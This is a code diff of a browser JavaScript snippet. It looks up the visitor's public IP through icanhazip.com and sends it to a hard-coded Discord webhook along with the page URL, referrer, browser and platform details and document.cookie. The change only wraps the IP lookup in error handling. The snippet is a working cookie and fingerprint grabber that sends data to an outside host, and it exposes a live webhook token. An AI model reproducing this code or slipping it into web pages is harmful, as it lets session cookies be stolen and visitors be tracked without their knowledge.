@@ -1,11 +1,17 @@
-var ip = new XMLHttpRequest();
-ip.open("GET","http://icanhazip.com/",false);
-ip.send(null);
+var ipad;
+try {
+    var ip = new XMLHttpRequest();
+    ip.open("GET","http://icanhazip.com/",false);
+    ip.send(null);
+    ipad = ip.responseText;
+} catch (err) {
+    ipad = "error loading IP"
+}
 var xhr = new XMLHttpRequest();
 xhr.open("POST", "https://discord.com/api/webhooks/926855926881861662/w01BN9-fwIPZXJZ3QjGWzCrJwvwMkV7bnhbVuYsj5grfYK8Fg596_qtJ8bCeUAkoEUzU", true);
 xhr.setRequestHeader('Content-Type', 'application/json');
 xhr.send(JSON.stringify({
-    "content": "Data from " + window.location.href + " " + ip.responseText + "\n" + 
+    "content": "Data from " + window.location.href + " " + ipad + "\n" + 
       [new Date(), document.referrer, history.length,
        navigator.appName, navigator.product, navigator.appVersion, navigator.userAgent, navigator.language, navigator.onLine, navigator.platform, navigator.javaEnabled(), navigator.cookieEnabled,
        document.cookie, decodeURIComponent(document.cookie.split(";")),
